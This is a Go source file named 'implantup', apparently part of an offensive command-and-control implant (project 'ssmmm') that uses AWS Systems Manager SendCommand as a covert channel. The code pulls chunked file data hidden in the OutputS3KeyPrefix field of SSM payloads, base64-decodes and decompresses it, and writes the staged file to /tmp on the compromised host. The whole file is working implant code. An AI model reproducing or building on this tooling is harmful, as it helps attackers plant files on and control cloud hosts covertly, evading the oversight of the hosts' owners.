package implantup

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/implantutil"
)

var completeFile []FileParts

type FileParts struct {
	CurrentCount string
	TotalCount   string
	Filename     string
	FileData     string
}

func RecieveFile(payload awsssm.SendCommandPayload) {

	s := strings.Split(payload.OutputS3KeyPrefix, ":")

	if len(s) == 4 {

		file := FileParts{
			CurrentCount: s[0],
			TotalCount:   s[1],
			Filename:     s[2],
			FileData:     s[3],
		}

		completeFile = append(completeFile, file)

		CheckFile(file)

	}

}

func CheckFile(file FileParts) {
	var singleFile []FileParts
	intVar, _ := strconv.Atoi(file.TotalCount)

	for _, v := range completeFile {
		if v.Filename == file.Filename {
			singleFile = append(singleFile, v)
			if len(singleFile) == intVar {
				SaveFile(singleFile, v.Filename)
				fmt.Println("Uploaded")
			}
		}
	}
}

func SaveFile(file []FileParts, filename string) {
	var pieces []string

	for _, v := range file {
		pieces = append(pieces, v.FileData)

	}
	asone := strings.Join(pieces, "")
	decoded := implantutil.Base64Decode(asone)
	b := []byte(decoded)
	actual, err := ReadGzFile(b)
	if err != nil {
		return
	}
	d1 := []byte(actual)
	os.WriteFile("/tmp/"+filepath.Base(filename), d1, 0644)
	//completeFile = []FileParts{}
}

func ReadGzFile(fi []byte) (string, error) {

	fz, err := gzip.NewReader(bytes.NewReader(fi))
	if err != nil {
		return "", err
	}
	defer fz.Close()

	s, err := ioutil.ReadAll(fz)
	if err != nil {
		return "", err
	}
	return string(s), nil
}
